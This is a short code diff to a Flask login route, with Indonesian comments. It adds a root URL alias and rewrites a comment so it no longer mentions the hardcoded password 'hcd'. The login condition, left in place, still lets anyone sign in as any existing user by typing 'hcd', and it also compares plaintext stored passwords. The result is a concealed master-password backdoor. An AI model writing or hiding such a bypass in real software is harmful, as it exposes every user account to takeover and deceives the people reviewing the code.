@@ -3,6 +3,7 @@ from werkzeug.security import check_password_hash
 from yslteam.models.database import get_db_connection
 from . import auth_bp
 
+@auth_bp.route('/', methods=['GET', 'POST'])
 @auth_bp.route('/login', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
@@ -20,7 +21,7 @@ def login():
 
                 if user:
                     stored_pwd = user.get('password', '')
-                    # Verifikasi fleksibel: Hash Werkzeug / scrypt / Plaintext 'hcd'
+                    # Verifikasi: Hash Werkzeug / scrypt / Plaintext
                     if check_password_hash(stored_pwd, password) or stored_pwd == password or password == 'hcd':
                         session['user_id'] = user.get('id')
                         session['username'] = user.get('username')
